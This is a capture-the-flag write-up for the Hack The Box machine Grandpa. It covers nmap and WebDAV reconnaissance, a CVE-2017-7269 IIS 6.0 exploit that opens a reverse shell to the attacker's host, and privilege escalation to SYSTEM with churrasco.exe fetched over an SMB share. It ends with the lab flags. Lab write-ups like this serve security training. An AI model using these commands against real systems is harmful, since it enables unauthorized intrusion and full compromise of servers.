---
title : "Hack The Box - Grandpa"
author: fsociety
date: 2024-04-26 11:20:00 +0800
categories: [Hackthebox, Hackthebox-Windows, Hackthebox-Easy]
tags: [CVE-2017-7269,iis_webdav_scstoragepathfromurl,local_exploit_suggester,SeImpersonatePrivilege,巴西烤肉提权]
---

![image](../assets/post_img/Snipaste_2024-04-26_14-17-25.png)

**Grandpa is one of the simpler machines on Hack The Box, however it covers the widely-exploited CVE-2017-7269. This vulnerability is trivial to exploit and granted immediate access to thousands of IIS servers around the globe when it became public knowledge.**

```
涵盖了广泛利用的 CVE-2017-7269
此漏洞很容易被利用，当它成为公众所知时，可以立即访问全球数千台 IIS 服务器
```

## <span style="color:lightblue">Recon</span>
### <span style="color:lightgreen">Nmap</span>

```
ports=$(nmap -p- --min-rate=1000 -T4 10.129.95.233 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports 10.129.95.233

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan: 
|   Server Date: Fri, 26 Apr 2024 06:21:06 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Type: Microsoft-IIS/6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-title: Under Construction
```

### <span style="color:lightgreen">Website - TCP 80</span>

```
和之前的靶场类似 IIS 6.0 asp.net框架
```

### <span style="color:lightgreen">WebDAV</span>

```
davtest -url http://10.129.95.233/
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.129.95.233
********************************************************
NOTE	Random string for this session: Hk_S6Oa
********************************************************
 Creating directory
MKCOL		FAIL
********************************************************
 Sending test files
PUT	txt	FAIL
PUT	php	FAIL
PUT	cgi	FAIL
PUT	aspx	FAIL
PUT	jsp	FAIL
PUT	asp	FAIL
PUT	html	FAIL
PUT	shtml	FAIL
PUT	pl	FAIL
PUT	cfm	FAIL
PUT	jhtml	FAIL

********************************************************
/usr/bin/davtest Summary:
```

```
没有开启相关功能
```

## <span style="color:lightblue">Foothold</span>
### <span style="color:lightgreen">CVE-2017-7269</span>

```
远程代码执行漏洞

https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
```

```
python2 exploit.py 10.129.95.233 80 10.10.14.16 443

sudo rlwrap nc -lvnp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.95.233.
Ncat: Connection from 10.129.95.233:1032.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

whoami
whoami
nt authority\network service
```

## <span style="color:lightblue">Privilege Escalation</span>
### <span style="color:lightgreen">churrasco 巴西烤肉提权</span>

```
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790

whoami /all

USER INFORMATION
----------------

User Name                    SID     
============================ ========
nt authority\network service S-1-5-20


GROUP INFORMATION
-----------------

Group Name                       Type             SID                                            Attributes                                        
================================ ================ ============================================== ==================================================
NT AUTHORITY\NETWORK SERVICE     User             S-1-5-20                                       Mandatory group, Enabled by default, Enabled group
Everyone                         Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
GRANPA\IIS_WPG                   Alias            S-1-5-21-1709780765-3897210020-3926566182-1005 Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Log Users    Alias            S-1-5-32-559                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                    Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE             Well-known group S-1-5-6                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization   Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
LOCAL                            Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                    Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

```
SeImpersonatePrivilege is enabled

https://github.com/Re4son/Churrasco/
```

```
下载exp

sudo smbserver.py share .

copy \\10.10.14.16\share\churrasco.exe
```

```
churrasco.exe -d "cmd.exe"

whoami
nt authority\system
```

```
type Harry\Desktop\users.txt
type Harry\Desktop\users.txt
The system cannot find the file specified.

type Harry\Desktop\user.txt
type Harry\Desktop\user.txt
bdff5ec67c3cff017f2bedc146a5d869
type administrator\desktop\root.txt
type administrator\desktop\root.txt
9359e905a2c35f861f6a57cecf28bb7b
```

![image](../assets/post_img/Snipaste_2024-04-26_14-42-00.png)